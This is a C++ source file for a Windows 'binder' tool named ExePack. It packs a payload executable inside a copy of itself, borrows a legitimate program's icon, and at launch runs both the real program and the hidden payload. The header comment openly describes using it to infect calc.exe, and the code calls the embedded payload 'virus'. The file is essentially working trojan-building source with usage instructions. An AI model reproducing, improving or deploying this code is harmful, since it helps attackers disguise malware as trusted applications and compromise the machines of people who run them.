#include "copyIcon.h"
#include "RCData.h"
#include "utils.h"

/*

Usage: ExePack.exe pack <pretend.exe> <payload.exe> <output.exe>

Example (infecting calc.exe, Windows Calculator app):

1. Run command: ExePack.exe pack calc.exe my_payload.exe InfectedCalc.exe
2. A new file "InfectedCalc.exe" will be created. It will have the icon of calc.exe.
3. When you run "InfectedCalc.exe", it will launch both the real calc.exe and my_payload.exe.

*/


// To toggle console for printing (https://stackoverflow.com/a/56834698/6069017):
// Properties -> Linker -> System -> SubSystem to "Windows (/SUBSYSTEM:WINDOWS)" or "Console (/SUBSYSTEM:CONSOLE)"

// Embedding runtime dll dependencies in exe (https://stackoverflow.com/a/32999084/6069017):
// Properties - > C/C++ -> Code Generation -> Runtime Library to /MT

int main() {
	return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWNORMAL);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	/* get argc, argv when using WinMain */
	// Snippet from: https://stackoverflow.com/a/57941046/6069017
	int argc;
	LPWSTR *szArglist = CommandLineToArgvW(GetCommandLineW(), &argc);
	char **argv = new char*[argc];
	for (int i = 0; i<argc; i++) {
		int lgth = wcslen(szArglist[i]);
		argv[i] = new char[lgth + 1];
		for (int j = 0; j <= lgth; j++)
			argv[i][j] = char(szArglist[i][j]);
	}
	LocalFree(szArglist);
	/* get argc, argv */

	if (argc == 5 && strcmp(argv[1], "pack") == 0) {
		char* self_path = argv[0];
		char* pretend = argv[2];
		char* virus = argv[3];
		char* output_target = argv[4];

		// Create a copy of self that will be the new infected file
		if (!CopyFileA(self_path, output_target, FALSE)) {
			MessageBoxA(NULL, "Failed to create the output file. Make sure you have permissions.", "Error", MB_OK | MB_ICONERROR);
			return 1;
		}

		ReplaceIcon(pretend, output_target);
		PutFileInRCData(pretend, output_target, 888);
		PutFileInRCData(virus, output_target, 999);

		MessageBoxA(NULL, "File created successfully!", "Success", MB_OK | MB_ICONINFORMATION);

		return 0;
	}

	RunFileInRCData(argv[0], 888, FALSE);
	RunFileInRCData(argv[0], 999, FALSE);

	// This memory was allocated for argv, but it's not freed in the original snippet.
	// It's good practice to free it.
	for (int i = 0; i < argc; i++) {
		delete[] argv[i];
	}
	delete[] argv;

	return 0;
}
